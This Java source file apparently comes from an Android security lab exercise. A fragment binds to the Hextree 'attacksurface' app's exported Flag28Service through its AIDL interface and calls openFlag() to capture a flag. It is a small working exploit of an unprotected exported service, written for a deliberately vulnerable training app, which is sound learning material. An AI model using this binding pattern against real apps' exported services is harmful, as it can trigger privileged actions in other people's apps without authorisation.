package com.appdev.intentattacks;

import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.util.Log;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

import io.hextree.attacksurface.services.IFlag28Interface;

public class Flag28Fragment extends Fragment {

    private static final String TAG = "Flag28Fragment";
    private IFlag28Interface aidlInterface;
    private boolean isBound = false;

    private ServiceConnection connection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder service) {
            aidlInterface = IFlag28Interface.Stub.asInterface(service);
            Log.i(TAG, "AIDL service connected");

            try {
                boolean result = aidlInterface.openFlag();
                Toast.makeText(getContext(), "openFlag() returned: " + result, Toast.LENGTH_LONG).show();
            } catch (Exception e) {
                Log.e(TAG, "Error calling openFlag()", e);
                Toast.makeText(getContext(), "Error calling openFlag()", Toast.LENGTH_LONG).show();
            }
        }

        @Override
        public void onServiceDisconnected(ComponentName name) {
            aidlInterface = null;
            isBound = false;
            Log.i(TAG, "AIDL service disconnected");
        }
    };

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_flag28, container, false);
        Button launchButton = view.findViewById(R.id.btnLaunchFlag28);

        launchButton.setOnClickListener(v -> {
            bindToAidlService();
        });

        return view;
    }

    private void bindToAidlService() {
        if (isBound || getActivity() == null) return;

        Intent intent = new Intent();
        intent.setComponent(new ComponentName(
                "io.hextree.attacksurface",
                "io.hextree.attacksurface.services.Flag28Service"
        ));

        isBound = getActivity().bindService(intent, connection, Context.BIND_AUTO_CREATE);
        Log.i(TAG, "Attempting to bind to service, result: " + isBound);
    }

    @Override
    public void onDestroyView() {
        super.onDestroyView();
        if (isBound && getActivity() != null) {
            getActivity().unbindService(connection);
            isBound = false;
        }
    }
}